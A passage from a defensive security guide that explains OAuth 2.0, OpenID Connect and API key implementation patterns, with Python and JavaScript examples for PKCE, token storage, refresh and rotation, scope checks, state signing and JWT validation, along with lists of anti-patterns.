code_verifier, code_challenge = generate_pkce_pair()

auth_url = (
    f"{auth_endpoint}?"
    f"response_type=code&"
    f"client_id={client_id}&"
    f"redirect_uri={redirect_uri}&"
    f"scope={scope}&"
    f"state={state}&"  # CSRF protection
    f"code_challenge={code_challenge}&"
    f"code_challenge_method=S256"
)

# Token exchange (after receiving authorization code)
token_response = requests.post(token_endpoint, data={
    'grant_type': 'authorization_code',
    'code': authorization_code,
    'redirect_uri': redirect_uri,
    'client_id': client_id,
    'code_verifier': code_verifier  # Proves possession of original challenge
})
```

**Anti-pattern:** Using `code_challenge_method=plain` exposes verifier to interception. Always use `S256`.

**Anti-pattern:** Reusing code_verifier across authorization attempts. Generate fresh pair per authorization flow.

**Critical:** Store code_verifier securely in session storage, never in URL parameters or localStorage where XSS can extract it.

### Token Storage Patterns

#### Backend-for-Frontend (BFF) Pattern

Eliminate token exposure to browser by storing tokens server-side and using HTTP-only session cookies.

```python
from flask import Flask, session, redirect, request
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    state = request.args.get('state')
    
    # Verify state to prevent CSRF
    if state != session.get('oauth_state'):
        return 'Invalid state', 400
    
    # Exchange code for tokens (server-side only)
    token_response = requests.post(token_endpoint, data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': redirect_uri,
        'client_id': client_id,
        'client_secret': client_secret,  # Safe on backend
        'code_verifier': session.get('code_verifier')
    })
    
    tokens = token_response.json()
    
    # Store tokens in server-side session, NOT client-side
    session['access_token'] = tokens['access_token']
    session['refresh_token'] = tokens['refresh_token']
    session['expires_at'] = time.time() + tokens['expires_in']
    
    return redirect('/dashboard')

@app.route('/api/data')
def api_proxy():
    """Proxy API calls to attach tokens server-side"""
    access_token = session.get('access_token')
    
    if not access_token or time.time() >= session.get('expires_at'):
        # Refresh token flow
        access_token = refresh_access_token(session.get('refresh_token'))
        session['access_token'] = access_token
    
    response = requests.get(
        f"{api_endpoint}/data",
        headers={'Authorization': f'Bearer {access_token}'}
    )
    
    return response.json()
```

**Trade-off:** Requires server infrastructure and introduces additional network hop. Eliminates XSS token theft risk entirely.

#### Encrypted Token Storage in Browser

When BFF pattern is not feasible, encrypt tokens before storing in localStorage/sessionStorage.

```javascript
// Use Web Crypto API for encryption
async function encryptToken(token, encryptionKey) {
    const encoder = new TextEncoder();
    const data = encoder.encode(token);
    
    const iv = crypto.getRandomValues(new Uint8Array(12));
    
    const encryptedData = await crypto.subtle.encrypt(
        {
            name: 'AES-GCM',
            iv: iv
        },
        encryptionKey,
        data
    );
    
    // Store IV with encrypted data
    return {
        encrypted: btoa(String.fromCharCode(...new Uint8Array(encryptedData))),
        iv: btoa(String.fromCharCode(...iv))
    };
}

// Derive encryption key from user session data (not stored)
async function deriveEncryptionKey(sessionSecret) {
    const encoder = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey(
        'raw',
        encoder.encode(sessionSecret),
        'PBKDF2',
        false,
        ['deriveKey']
    );
    
    return crypto.subtle.deriveKey(
        {
            name: 'PBKDF2',
            salt: encoder.encode('oauth-token-encryption'),
            iterations: 100000,
            hash: 'SHA-256'
        },
        keyMaterial,
        { name: 'AES-GCM', length: 256 },
        false,
        ['encrypt', 'decrypt']
    );
}
```

**Caveat:** Encryption key must not be stored in browser. Derive from ephemeral session data or use device-bound keys (WebAuthn).

**Anti-pattern:** Storing tokens in localStorage without encryption. XSS vulnerabilities allow complete token exfiltration.

### Token Refresh Patterns

#### Silent Token Refresh

Proactively refresh tokens before expiration to prevent user-facing authentication interruptions.

```javascript
class TokenManager {
    constructor(tokenEndpoint, clientId, refreshToken) {
        this.tokenEndpoint = tokenEndpoint;
        this.clientId = clientId;
        this.refreshToken = refreshToken;
        this.accessToken = null;
        this.expiresAt = 0;
        this.refreshPromise = null;
        
        // Refresh threshold: 5 minutes before expiry
        this.refreshThreshold = 300;
    }
    
    async getAccessToken() {
        const now = Math.floor(Date.now() / 1000);
        
        if (this.accessToken && now < this.expiresAt - this.refreshThreshold) {
            return this.accessToken;
        }
        
        // Prevent concurrent refresh requests (request coalescing)
        if (this.refreshPromise) {
            return this.refreshPromise;
        }
        
        this.refreshPromise = this._refreshToken();
        
        try {
            return await this.refreshPromise;
        } finally {
            this.refreshPromise = null;
        }
    }
    
    async _refreshToken() {
        const response = await fetch(this.tokenEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: this.refreshToken,
                client_id: this.clientId
            })
        });
        
        if (!response.ok) {
            // Refresh token invalid/expired: force re-authentication
            this.clearTokens();
            throw new Error('Token refresh failed');
        }
        
        const tokens = await response.json();
        
        this.accessToken = tokens.access_token;
        this.expiresAt = Math.floor(Date.now() / 1000) + tokens.expires_in;
        
        // Refresh token rotation: update if new token provided
        if (tokens.refresh_token) {
            this.refreshToken = tokens.refresh_token;
            this.persistRefreshToken(tokens.refresh_token);
        }
        
        return this.accessToken;
    }
    
    clearTokens() {
        this.accessToken = null;
        this.refreshToken = null;
        this.expiresAt = 0;
        // Trigger re-authentication flow
        window.location.href = '/login';
    }
}
```

**Critical:** Implement refresh token rotation (RFC 6819) where each refresh invalidates previous refresh token. Prevents token replay if refresh token leaks.

#### Automatic Retry with Exponential Backoff

Handle transient token endpoint failures without surfacing errors to users.

```python
import time
import random

class TokenRefreshError(Exception):
    pass

def refresh_token_with_retry(refresh_token, max_retries=3):
    """
    Retry token refresh with exponential backoff and jitter
    """
    for attempt in range(max_retries):
        try:
            response = requests.post(token_endpoint, data={
                'grant_type': 'refresh_token',
                'refresh_token': refresh_token,
                'client_id': client_id,
                'client_secret': client_secret
            }, timeout=10)
            
            if response.status_code == 400:
                # Invalid refresh token: don't retry
                error = response.json().get('error')
                if error == 'invalid_grant':
                    raise TokenRefreshError('Refresh token invalid or expired')
            
            response.raise_for_status()
            return response.json()
            
        except requests.exceptions.RequestException as e:
            if attempt == max_retries - 1:
                raise TokenRefreshError(f'Token refresh failed after {max_retries} attempts')
            
            # Exponential backoff with jitter
            base_delay = 2 ** attempt
            jitter = random.uniform(0, 0.3 * base_delay)
            delay = base_delay + jitter
            
            time.sleep(delay)
```

**Anti-pattern:** Infinite retry loop on persistent authorization server failures. Implement circuit breaker to prevent cascading failures.

### Scope Management Patterns

#### Least Privilege Scope Request

Request only scopes required for current operation, not all possible scopes.

```python
class ScopeManager:
    def __init__(self, base_scopes):
        self.base_scopes = base_scopes  # Always requested
        self.granted_scopes = set()
    
    def request_authorization(self, additional_scopes=None):
        """Request authorization with minimal required scopes"""
        requested_scopes = self.base_scopes.copy()
        
        if additional_scopes:
            requested_scopes.update(additional_scopes)
        
        auth_url = build_auth_url(scopes=' '.join(requested_scopes))
        return auth_url
    
    def store_granted_scopes(self, scope_string):
        """Store actual granted scopes from token response"""
        self.granted_scopes = set(scope_string.split())
    
    def has_scope(self, required_scope):
        """Check if required scope was granted"""
        return required_scope in self.granted_scopes
    
    def request_incremental_scope(self, new_scope):
        """
        Request additional scope without re-requesting existing scopes
        Supported by Google, Microsoft identity platforms
        """
        if self.has_scope(new_scope):
            return None  # Already have scope
        
        # Include existing scopes to maintain access
        all_scopes = self.granted_scopes.copy()
        all_scopes.add(new_scope)
        
        return build_auth_url(
            scopes=' '.join(all_scopes),
            prompt='consent'  # Force consent for new scope
        )
```

**Anti-pattern:** Requesting `user:*` or overly broad scopes during initial authorization. Users are more likely to deny consent for excessive permissions.

#### Dynamic Scope Validation

Validate token scopes before executing privileged operations.

```python
from functools import wraps
from flask import request, jsonify

def require_scopes(*required_scopes):
    """Decorator to enforce scope requirements on endpoints"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            token = extract_token_from_header(request.headers.get('Authorization'))
            
            if not token:
                return jsonify({'error': 'No token provided'}), 401
            
            # Introspect token or decode JWT to extract scopes
            token_scopes = get_token_scopes(token)
            
            # Check if all required scopes are present
            missing_scopes = set(required_scopes) - set(token_scopes)
            
            if missing_scopes:
                return jsonify({
                    'error': 'insufficient_scope',
                    'error_description': f'Missing required scopes: {missing_scopes}',
                    'scope': ' '.join(required_scopes)
                }), 403
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/api/admin/users')
@require_scopes('admin:read', 'users:read')
def list_users():
    # Only executed if token has both required scopes
    return jsonify(get_all_users())
```

**Critical:** Never trust scope claims without verification. Always validate against token issued by trusted authorization server.

### State Management and CSRF Protection

#### Cryptographically Secure State Parameter

```python
import secrets
import hmac
import json
import base64

class StateManager:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def generate_state(self, metadata=None):
        """
        Generate state with embedded metadata and HMAC signature
        """
        nonce = secrets.token_urlsafe(32)
        timestamp = int(time.time())
        
        payload = {
            'nonce': nonce,
            'timestamp': timestamp,
            'metadata': metadata or {}
        }
        
        payload_bytes = json.dumps(payload).encode('utf-8')
        payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode('utf-8')
        
        # Sign with HMAC to prevent tampering
        signature = hmac.new(
            self.secret_key.encode('utf-8'),
            payload_b64.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        return f"{payload_b64}.{signature}"
    
    def verify_state(self, state, max_age=600):
        """
        Verify state signature and freshness
        Returns metadata if valid, raises exception otherwise
        """
        try:
            payload_b64, signature = state.split('.')
        except ValueError:
            raise ValueError('Invalid state format')
        
        # Verify HMAC signature
        expected_signature = hmac.new(
            self.secret_key.encode('utf-8'),
            payload_b64.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        if not hmac.compare_digest(signature, expected_signature):
            raise ValueError('Invalid state signature')
        
        # Decode payload
        payload_bytes = base64.urlsafe_b64decode(payload_b64)
        payload = json.loads(payload_bytes)
        
        # Check timestamp to prevent replay attacks
        timestamp = payload['timestamp']
        age = int(time.time()) - timestamp
        
        if age > max_age:
            raise ValueError(f'State expired (age: {age}s)')
        
        return payload['metadata']
```

**Anti-pattern:** Using sequential or predictable state values. Attackers can forge state parameters to bypass CSRF protection.

**Anti-pattern:** Not verifying state expiration. Old authorization responses can be replayed.

### Client Credentials Flow for Service-to-Service

Machine-to-machine authentication without user context.

```python
import threading
import time

class ClientCredentialsManager:
    def __init__(self, token_endpoint, client_id, client_secret, scopes):
        self.token_endpoint = token_endpoint
        self.client_id = client_id
        self.client_secret = client_secret
        self.scopes = scopes
        
        self.access_token = None
        self.expires_at = 0
        self.lock = threading.Lock()
    
    def get_access_token(self):
        """Thread-safe token acquisition with automatic refresh"""
        with self.lock:
            if self.access_token and time.time() < self.expires_at - 60:
                return self.access_token
            
            response = requests.post(
                self.token_endpoint,
                auth=(self.client_id, self.client_secret),  # HTTP Basic Auth
                data={
                    'grant_type': 'client_credentials',
                    'scope': ' '.join(self.scopes)
                }
            )
            
            response.raise_for_status()
            tokens = response.json()
            
            self.access_token = tokens['access_token']
            self.expires_at = time.time() + tokens['expires_in']
            
            return self.access_token
```

**Security consideration:** Client credentials grant provides no refresh token. Each token acquisition requires client secret transmission. Use mutual TLS for additional transport security.

**Anti-pattern:** Using client credentials flow for user-facing applications. This pattern bypasses user consent and provides no user identity context.

### Token Introspection Pattern

Validate token validity and extract metadata without decoding JWT locally.

```python
def introspect_token(token, client_id, client_secret):
    """
    Call OAuth2 introspection endpoint (RFC 7662)
    Returns token metadata if active, None otherwise
    """
    response = requests.post(
        introspection_endpoint,
        auth=(client_id, client_secret),
        data={'token': token}
    )
    
    response.raise_for_status()
    result = response.json()
    
    if not result.get('active'):
        return None
    
    return {
        'scopes': result.get('scope', '').split(),
        'expires_at': result.get('exp'),
        'subject': result.get('sub'),
        'client_id': result.get('client_id'),
        'token_type': result.get('token_type')
    }

# Use introspection for opaque tokens or when local JWT validation is not feasible
def validate_request():
    token = extract_bearer_token(request.headers.get('Authorization'))
    
    token_info = introspect_token(token, client_id, client_secret)
    
    if not token_info:
        return jsonify({'error': 'invalid_token'}), 401
    
    if 'required:scope' not in token_info['scopes']:
        return jsonify({'error': 'insufficient_scope'}), 403
    
    # Token valid, proceed with request
    return process_request(token_info)
```

**Trade-off:** Introspection adds network latency and load on authorization server. Cache introspection results with short TTL (60-300 seconds) to reduce overhead.

**Use case:** Introspection is mandatory for opaque tokens (non-JWT). For JWT tokens, prefer local validation with cached JWKS.

### Device Authorization Flow

OAuth2 for devices with limited input capabilities (smart TVs, IoT devices).

```python
import qrcode
import io

def initiate_device_flow(client_id, scopes):
    """
    RFC 8628: Device Authorization Grant
    """
    response = requests.post(
        device_authorization_endpoint,
        data={
            'client_id': client_id,
            'scope': ' '.join(scopes)
        }
    )
    
    response.raise_for_status()
    device_info = response.json()
    
    # device_info contains:
    # - device_code: used for polling
    # - user_code: user enters this on verification_uri
    # - verification_uri: where user authenticates
    # - verification_uri_complete: optional, includes user_code as param
    # - expires_in: device_code lifetime
    # - interval: minimum polling interval
    
    return device_info

def display_user_instructions(device_info):
    """Display user code and verification URL"""
    print(f"Go to: {device_info['verification_uri']}")
    print(f"Enter code: {device_info['user_code']}")
    
    # Optionally generate QR code for verification_uri_complete
    if 'verification_uri_complete' in device_info:
        qr = qrcode.QRCode()
        qr.add_data(device_info['verification_uri_complete'])
        qr.make()
        
        qr_image = io.BytesIO()
        qr.make_image().save(qr_image, format='PNG')
        return qr_image.getvalue()

def poll_for_token(device_code, client_id, interval, expires_in):
    """
    Poll token endpoint until user completes authorization
    """
    start_time = time.time()
    
    while time.time() - start_time < expires_in:
        time.sleep(interval)
        
        response = requests.post(
            token_endpoint,
            data={
                'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
                'device_code': device_code,
                'client_id': client_id
            }
        )
        
        if response.status_code == 200:
            # Authorization complete
            return response.json()
        
        error = response.json().get('error')
        
        if error == 'authorization_pending':
            # User hasn't completed authorization yet
            continue
        elif error == 'slow_down':
            # Increase polling interval
            interval += 5
            continue
        elif error == 'expired_token':
            raise Exception('Device code expired')
        elif error == 'access_denied':
            raise Exception('User denied authorization')
        else:
            raise Exception(f'Unknown error: {error}')
    
    raise Exception('Polling timeout reached')
```

**Anti-pattern:** Polling faster than specified `interval`. Authorization servers may temporarily block clients that poll too aggressively.

### JWT Validation Pattern

Local token validation without introspection endpoint dependency.

```python
import jwt
from jwt import PyJWKClient
from functools import lru_cache

class JWTValidator:
    def __init__(self, jwks_uri, issuer, audience):
        self.jwks_client = PyJWKClient(
            jwks_uri,
            cache_keys=True,
            max_cached_keys=16
        )
        self.issuer = issuer
        self.audience = audience
    
    @lru_cache(maxsize=1000)
    def get_signing_key(self, kid):
        """Cache signing keys by key ID"""
        return self.jwks_client.get_signing_key(kid)
    
    def validate_token(self, token):
        """
        Validate JWT signature, issuer, audience, and expiration
        """
        try:
            # Decode header to extract key ID
            unverified_header = jwt.get_unverified_header(token)
            kid = unverified_header.get('kid')
            
            if not kid:
                raise ValueError('Token missing key ID')
            
            # Fetch signing key from JWKS endpoint
            signing_key = self.get_signing_key(kid)
            
            # Validate and decode token
            payload = jwt.decode(
                token,
                signing_key.key,
                algorithms=['RS256', 'ES256'],  # Allowed algorithms
                issuer=self.issuer,
                audience=self.audience,
                options={
                    'verify_signature': True,
                    'verify_exp': True,
                    'verify_nbf': True,
                    'verify_iat': True,
                    'require': ['exp', 'iat', 'sub']
                }
            )
            
            return payload
            
        except jwt.ExpiredSignatureError:
            raise ValueError('Token expired')
        except jwt.InvalidAudienceError:
            raise ValueError('Invalid audience')
        except jwt.InvalidIssuerError:
            raise ValueError('Invalid issuer')
        except jwt.InvalidSignatureError:
            raise ValueError('Invalid signature')
        except Exception as e:
            raise ValueError(f'Token validation failed: {str(e)}')
```

**Critical:** Always validate algorithm. Algorithm confusion attacks (e.g., treating RS256 token as HS256) allow signature bypass.

**Critical:** Validate `aud` claim matches your application's client ID. Prevents token substitution attacks where attacker uses token from different application.

### Refresh Token Rotation and Revocation

```python
class RefreshTokenStore:
    """
    Track refresh token families for rotation and revocation
    """
    def __init__(self, redis_client):
        self.redis = redis_client
    
    def create_token_family(self, user_id, initial_refresh_token):
        """Initialize new refresh token family"""
        family_id = secrets.token_urlsafe(32)
        
        self.redis.hset(f"token_family:{family_id}", mapping={
            'user_id': user_id,
            'current_token': initial_refresh_token,
            'created_at': time.time(),
            'rotation_count': 0
        })
        
        # Map token to family for lookup
        self.redis.setex(
            f"token_to_family:{initial_refresh_token}",
            86400 * 30,  # 30 days
            family_id
        )
        
        return family_id
    
    def rotate_token(self, old_refresh_token, new_refresh_token):
        """
        Rotate refresh token within family
        Detects replay attacks if old token used again
        """
        family_id = self.redis.get(f"token_to_family:{old_refresh_token}")
        
        if not family_id:
            raise ValueError('Invalid refresh token')
        
        family_data = self.redis.hgetall(f"token_family:{family_id}")
        
        # Check if presented token matches current token in family
        if family_data['current_token'] != old_refresh_token:
            # Replay attack detected: revoke entire family
            self.revoke_token_family(family_id)
            raise ValueError('Refresh token reuse detected - family revoked')
        
        # Update family with new token
        rotation_count = int(family_data['rotation_count']) + 1
        
        self.redis.hset(f"token_family:{family_id}", mapping={
            'current_token': new_refresh_token,
            'rotation_count': rotation_count,
            'last_rotation': time.time()
        })
        
        # Delete old token mapping
        self.redis.delete(f"token_to_family:{old_refresh_token}")
        
        # Create new token mapping
        self.redis.setex(
            f"token_to_family:{new_refresh_token}",
            86400 * 30,
            family_id
        )
    
    def revoke_token_family(self, family_id):
        """Revoke all tokens in family (e.g., on logout or security event)"""
        family_data = self.redis.hgetall(f"token_family:{family_id}")
        
        if family_data:
            # Remove current token mapping
            current_token = family_data.get('current_token')
            if current_token:
                self.redis.delete(f"token_to_family:{current_token}")
            
            # Mark family as revoked
            self.redis.hset(f"token_family:{family_id}", 'revoked', 'true')
```

**Caveat:** Refresh token rotation increases complexity and can cause race conditions in concurrent refresh scenarios. Implement grace period (30-60 seconds) where both old and new refresh tokens are valid.

### Anti-Patterns Summary

1. **Storing tokens in localStorage without encryption**: Complete XSS vulnerability exposure
2. **Using implicit flow for new applications**: Deprecated by OAuth 2.1, replaced with authorization code + PKCE
3. **Not implementing PKCE for public clients**: Allows authorization code interception
4. **Refresh token without rotation**: Unlimited lifetime if refresh token leaks
5. **Not validating redirect_uri**: Open redirect vulnerability enabling authorization code theft
6. **Trusting client-provided scope claims**: Always validate scopes from token issued by authorization server
7. **Synchronous token refresh in request path**: Creates latency spikes; use background refresh
8. **No token revocation mechanism**: Cannot invalidate compromised tokens
9. **Hardcoding authorization server URLs**: Prevents discovery-based configuration updates; use OpenID Connect Discovery
10. **Not implementing state parameter expiration**: Enables CSRF replay attacks

**Related topics:** OpenID Connect ID token validation, JWT encryption (JWE) for sensitive claims, Pushed Authorization Requests (PAR) for enhanced security, mutual TLS client authentication, Demonstrating Proof of Possession (DPoP) for token binding, OAuth 2.1 consolidation changes, federated identity patterns with multiple authorization servers.

---

## OpenID Connect Patterns

OpenID Connect (OIDC) extends OAuth 2.0 to provide authentication layer capabilities, delivering identity verification through standardized token formats and discovery mechanisms. Implementation patterns address session management, token lifecycle, claims validation, and integration with heterogeneous client architectures.

### Core Flow Patterns

**Authorization Code Flow with PKCE**

- Mandatory for public clients (SPAs, mobile apps) lacking client secret storage capability
- PKCE (Proof Key for Code Exchange) mitigates authorization code interception attacks
- Code verifier (high-entropy random string) and code challenge (SHA-256 hash) prevent code substitution
- Eliminates implicit flow vulnerability surface (token exposure in browser history, referrer headers)

**Hybrid Flow**

- Combines authorization code and implicit flows for split token delivery
- ID token returned immediately via front channel (redirect URL fragment)
- Access/refresh tokens obtained via back channel (token endpoint)
- Use case: Server-rendered applications requiring immediate identity verification before token exchange
- [Inference] Increases attack surface by exposing ID token to browser, requires careful response_mode selection

**Client Credentials Flow**

- Machine-to-machine authentication without user context
- Service account authentication using client_id and client_secret
- No ID token issued (no user identity claim)
- Access token represents application identity, not end-user
- Use case: Backend service integration, batch processing, daemon applications

### Token Management Patterns

**Refresh Token Rotation**

- One-time-use refresh tokens issued with each access token refresh
- Previous refresh token invalidated immediately upon use
- Detects token theft: reuse of revoked refresh token triggers full session termination
- Requires persistent storage mapping refresh token families to sessions
- [Inference] Implementation complexity increases with distributed session stores requiring atomic operations

**Silent Authentication (prompt=none)**

- Iframe-based token refresh leveraging existing session cookies
- Avoids user interaction during token renewal
- Fails if session expired or consent required
- Mitigation for third-party cookie restrictions: use refresh tokens instead
- **Anti-pattern:** Polling with prompt=none creates excessive Authorization Server load

**Access Token Lifespan Strategy**

- Short-lived access tokens (5-15 minutes) limit compromise window
- Long-lived refresh tokens (hours to days) for extended sessions
- Opaque tokens require introspection endpoint calls for validation
- JWT access tokens enable stateless validation but complicate revocation
- [Inference] Token lifespan impacts Authorization Server load - shorter lifespans increase refresh requests

### Claims and Scope Patterns

**Standard Claims vs Custom Claims**

- Standard claims (sub, name, email, picture) defined in OIDC specification
- Custom claims require namespace prefixing to prevent collision
- Claims requested via scope parameter (profile, email, address, phone)
- Fine-grained claims selection using claims parameter (id_token, userinfo)

**Claims Aggregation and Distribution**

- **Aggregated Claims:** Claims sourced from external providers, referenced by URL in token
- **Distributed Claims:** Claims retrieved from external endpoints using access tokens
- Use case: Federated identity where claims reside in multiple systems
- Requires additional network calls to resolve full user profile
- [Inference] Introduces latency and availability dependencies on external claim sources

**Essential vs Voluntary Claims**

- Essential claims marked in authentication request (claims parameter with essential:true)
- Authorization Server may fail authentication if essential claims unavailable
- Voluntary claims returned when available, omitted otherwise
- Use case: Enforcing mandatory profile data for specific application flows

### Session Management Patterns

**Back-Channel Logout**

- Authorization Server sends logout notification to registered logout endpoints
- Applications receive logout token (JWT) via HTTP POST
- Enables global logout across federated applications
- Requires persistent session tracking and webhook endpoint implementation
- Network failures may prevent logout propagation - applications must implement timeout-based session cleanup

**Front-Channel Logout**

- Browser-based logout using hidden iframes pointing to logout endpoints
- Applications clear local session upon iframe load
- Vulnerable to third-party cookie restrictions and Content Security Policy blocks
- Deprecated in favor of back-channel logout for security-sensitive applications

**Session Polling and Activity Tracking**

- Periodic check_session_iframe validation of session status
- Detects session termination at Authorization Server
- Requires cross-origin iframe communication (postMessage API)
- [Inference] Client-side session monitoring adds complexity and may not detect immediate revocation

### Security Hardening Patterns

**State Parameter and CSRF Protection**

- Cryptographically random state parameter bound to user session
- Validated upon authorization callback to prevent cross-site request forgery
- Must be single-use and expire after short duration
- Store in HttpOnly session cookie or server-side session storage

**Nonce Parameter for Replay Prevention**

- Included in authentication request, returned in ID token claims
- Client validates nonce match before accepting ID token
- Prevents token replay attacks where attacker intercepts and reuses ID token
- Must be cryptographically random and single-use per authentication request

**ID Token Validation Sequence**

```
1. Verify signature using Authorization Server's public key (JWKS endpoint)
2. Validate issuer (iss) matches expected Authorization Server URL
3. Validate audience (aud) contains client_id
4. Verify token not expired (exp claim)
5. Verify issued time reasonable (iat claim, allow clock skew)
6. Validate nonce matches original request
7. Validate at_hash if access token returned (hybrid/implicit flow)
8. Verify azp (authorized party) if multiple audiences present
```

**Token Binding**

- Cryptographically bind tokens to TLS connection or client certificate
- Prevents token theft and replay across different contexts
- DPoP (Demonstrating Proof-of-Possession) for OAuth 2.0 provides sender-constrained tokens
- [Unverified] Browser support for Token Binding specification remains limited; DPoP gaining adoption

### Multi-Tenant and B2B Patterns

**Tenant Isolation via Issuer**

- Separate Authorization Server instance per tenant
- Complete data and configuration isolation
- Increased operational complexity and infrastructure costs
- [Inference] Requires dynamic discovery document resolution per tenant

**Tenant Discrimination via Claims**

- Single Authorization Server, tenant identified via custom claim (tenant_id, org_id)
- Application enforces authorization based on tenant claim
- Shared token signing keys across tenants
- Risk: claim injection or manipulation if Authorization Server compromised

**Home Realm Discovery**

- Email domain or user identifier determines correct Identity Provider
- Redirect user to tenant-specific login page
- Requires account enumeration mitigation (generic error messages)
- Use case: Federated SSO where users authenticate via corporate Identity Provider

### Mobile and Native Application Patterns

**AppAuth Pattern (PKCE + Claimed HTTPS Redirect)**

- Authorization code flow with PKCE using platform browser (not embedded WebView)
- Custom URL scheme (myapp://) or claimed HTTPS redirect (https://myapp.com/callback)
- System browser preserves existing SSO sessions
- **Anti-pattern:** Embedded WebView enables credential interception and lacks SSO

**Refresh Token Persistence**

- Secure storage using platform-provided key stores (iOS Keychain, Android KeyStore)
- Encrypt refresh tokens at rest using hardware-backed keys when available
- Biometric authentication required before token usage (additional layer)
- [Inference] Token exfiltration risk remains if device compromised or rooted/jailbroken

**Token Revocation on App Uninstall**

- Platform limitations prevent cleanup hooks on uninstall
- Refresh tokens remain valid until expiration or explicit revocation
- Mitigation: Shorter refresh token lifespan for mobile clients
- Mitigation: Device attestation and binding to detect reinstalls

### Single Page Application Patterns

**Backend-for-Frontend (BFF) Token Handler**

- Tokens stored in backend session, not browser storage
- SPA makes API calls to BFF proxy, which adds access token
- Eliminates XSS token theft risk (tokens never in JavaScript context)
- Requires session management infrastructure and increases latency
- [Inference] Optimal for high-security applications where token theft consequences severe

**Token Storage Considerations**

- **localStorage/sessionStorage:** Vulnerable to XSS attacks, no automatic expiration
- **Memory-only storage:** Lost on page refresh, poor user experience
- **HttpOnly cookies:** Protected from XSS, requires SameSite=Strict and CSRF protection
- Authorization Server refresh token rotation mitigates theft impact

**Cross-Origin Resource Sharing (CORS)**

- Authorization Server must allow CORS preflight requests from SPA origin
- Token endpoint, userinfo endpoint require CORS headers
- [Inference] CORS misconfiguration may expose tokens to unauthorized origins
- Use specific origin allowlisting, not wildcard (*)

### Federation and Broker Patterns

**Identity Broker Aggregation**

- Single OIDC interface abstracting multiple upstream Identity Providers
- Protocol translation (SAML, LDAP, proprietary protocols) to OIDC
- Centralized claim mapping and enrichment
- Use case: Migrating from legacy protocols, multi-IdP environments

**Step-Up Authentication**

- Initial authentication with standard assurance level
- Additional verification required for sensitive operations (acr_values parameter)
- Request specific Authentication Context Class Reference (ACR) values
- Authorization Server may prompt for additional factors (MFA, biometric)
- ID token includes acr claim indicating achieved assurance level

**Account Linking**

- Associate multiple external identities with single application account
- Challenge: Determining canonical identity and preventing unauthorized linking
- Mitigation: Email verification or additional authentication before linking
- [Inference] Race conditions in concurrent linking operations may create orphaned associations

### Implementation Anti-Patterns

**Trusting ID Token Without Signature Validation**

- Unsigned tokens (alg=none) allow trivial forgery
- Signature validation ensures token issued by trusted Authorization Server
- Must verify against current JWKS from Authorization Server (cache with TTL)

**Using Implicit Flow for Confidential Clients**

- Exposes tokens in browser history, referrer headers, and front-channel communications
- Authorization code flow with client authentication provides superior security
- Implicit flow deprecated for all client types in OAuth 2.1

**Storing Tokens in URL Parameters**

- Tokens logged in server access logs, browser history, analytics systems
- Use POST-based token delivery or secure headers instead
- Fragment (#) storage marginally better but still suboptimal

**Long-Lived Access Tokens with Broad Scopes**

- Compromise provides extensive access for extended period
- Principle of least privilege: minimal scope, short lifespan
- Use refresh tokens for long-running sessions, not long-lived access tokens

**Insufficient Redirect URI Validation**

- Open redirector vulnerability enables authorization code theft
- Require exact match validation, no wildcards or partial matching
- Register all valid redirect URIs explicitly at Authorization Server

### Monitoring and Operational Patterns

**Token Introspection Overhead**

- Opaque token validation requires network call to introspection endpoint per request
- Caching introspection results risks serving revoked tokens
- JWT validation eliminates network dependency but complicates revocation
- [Inference] Balance between stateless scalability (JWT) and immediate revocation (opaque + introspection)

**Authorization Server High Availability**

- Token endpoint downtime prevents new authentication and token refresh
- Clients should implement exponential backoff and circuit breakers
- Consider active-active replication or regional failover
- [Inference] Client-side caching of valid tokens mitigates temporary Authorization Server unavailability

**Audit Logging Requirements**

- Authentication attempts (success/failure with reason codes)
- Token issuance and refresh events
- Logout operations and session terminations
- Scope and consent changes
- Anomalous patterns (geographic, velocity, user-agent changes)

### Related Topics

- OAuth 2.0 grant types and security considerations
- JWT structure, claims, and cryptographic validation
- SAML 2.0 integration and protocol bridging
- Mutual TLS (mTLS) client authentication
- Zero Trust architecture and continuous authentication
- Privacy-preserving identity protocols (Self-Sovereign Identity, DIDs)
- Authorization Server selection criteria and deployment topologies
- Token revocation strategies and immediate termination patterns

---

## API Key Pattern

An API key pattern authenticates and authorizes client requests to APIs through static, bearer-token credentials distributed to consumers. The key serves as a shared secret identifying the calling application or service, enabling access control, rate limiting, and usage tracking without interactive authentication flows.

### Core Characteristics

**Static Credential**: API key remains constant until explicitly rotated, unlike session tokens that expire automatically. Simplifies client implementation but increases exposure risk from key compromise.

**Bearer Token Semantics**: Possession of the key grants access rights. No cryptographic proof of identity required beyond presenting the valid key value. Compromise of key value equals complete credential compromise.

**Opaque Identifier**: Key string typically contains no semantic information. Authorization decisions occur server-side through key-to-permissions mapping in secure storage.

### Key Generation Requirements

**Entropy Standards**: Minimum 128 bits of cryptographic randomness (256 bits recommended). Use `crypto.getRandomValues()`, `/dev/urandom`, or equivalent CSPRNG. Never use predictable sources like timestamps, sequential counters, or weak PRNGs.

**Encoding Schemes**:

- Base64url encoding (RFC 4648) for URL-safe transmission without escaping
- Hexadecimal encoding for human readability but 33% larger size
- Custom alphabets (alphanumeric excluding ambiguous characters) for manual transcription scenarios

**Prefix Conventions**: Embed identifiable prefix for key type detection and automated secret scanning. Example: `sk_live_`, `pk_test_`, `api_`. Enables detection in committed code, logs, or public repositories through pattern matching.

**Length Considerations**: Balance security against usability. 32-byte keys (256 bits) encoded as 43-character base64url strings provide sufficient security margin. Shorter keys risk brute force attacks; longer keys impede manual handling without security benefit.

### Storage and Hashing

**Server-Side Storage**: [Inference] Hash keys using slow, memory-hard functions before storage. Never store plaintext keys.

**Argon2id Parameters**: Memory cost 64MB minimum, time cost 3-4 iterations, parallelism factor matching available CPU cores. Produces irreversible hash resistant to GPU cracking.

